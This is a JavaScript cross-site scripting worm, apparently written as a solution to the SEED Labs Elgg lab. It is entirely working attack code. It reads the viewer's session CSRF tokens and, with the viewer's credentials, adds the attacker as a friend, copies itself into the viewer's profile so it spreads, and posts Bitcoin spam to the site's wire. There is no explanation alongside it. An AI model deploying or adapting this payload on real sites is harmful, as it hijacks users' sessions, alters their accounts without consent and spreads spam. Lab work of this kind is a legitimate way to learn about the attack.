<script id="worm">
    window.onload = async () => {
        if (elgg.session.user.guid != '59') {
            var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
            var jsCode = document.getElementById("worm").innerHTML;
            var tailTag = "</" + "script>";
            // adding samy
            await fetch(`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}`, {
                "credentials": "include",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-US,en;q=0.5",
                    "X-Requested-With": "XMLHttpRequest",
                    "Sec-GPC": "1"
                },
                "referrer": "http://www.seed-server.com/profile/charlie",
                "method": "GET",
                "mode": "cors"
            });


            await fetch("http://www.seed-server.com/action/profile/edit", {
                "credentials": "include",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "multipart/form-data; boundary=---------------------------16546421854908877592980733358",
                    "Sec-GPC": "1",
                    "Upgrade-Insecure-Requests": "1"
                },
                "referrer": `http://www.seed-server.com/profile/${elgg.session.user.username}/`,
                "body": `-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"__elgg_token\"\r\n\r\n${elgg.security.token.__elgg_token}\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"__elgg_ts\"\r\n\r\n${elgg.security.token.__elgg_ts}\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n${elgg.session.user.name}\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n<p>Hi I am ${elgg.session.user.name} ;)${(headerTag + jsCode + tailTag)}</p>\r\n\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[description]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"briefdescription\"\r\n\r\nHellooo\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[briefdescription]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\nCalifornia\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[location]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"interests\"\r\n\r\nBitcoin\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[interests]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"skills\"\r\n\r\nhackerman\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[skills]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"contactemail\"\r\n\r\nsamy@samy1234.com\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[contactemail]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n911\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[phone]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n5551234567\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[mobile]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\nhttp://www.samy1234.com\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[website]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"twitter\"\r\n\r\nsamyX\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"accesslevel[twitter]\"\r\n\r\n1\r\n-----------------------------16546421854908877592980733358\r\nContent-Disposition: form-data; name=\"guid\"\r\n\r\n${elgg.session.user.guid}\r\n-----------------------------16546421854908877592980733358--\r\n`,
                "method": "POST",
                "mode": "cors"
            });

            await fetch("http://www.seed-server.com/action/thewire/add", {
                "credentials": "include",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "multipart/form-data; boundary=---------------------------38410652464770034393767380115",
                    "Sec-GPC": "1",
                    "Upgrade-Insecure-Requests": "1"
                },
                "referrer": "http://www.seed-server.com/thewire/all",
                "body": `-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"__elgg_token\"\r\n\r\n${elgg.security.token.__elgg_token}\r\n-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"__elgg_ts\"\r\n\r\n${elgg.security.token.__elgg_ts}\r\n-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\nTo earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/${elgg.session.user.username} (Super Bitcoin Mania!!!)\r\n-----------------------------38410652464770034393767380115--\r\n`,
                "method": "POST",
                "mode": "cors"
            });
        };
    };
</script>
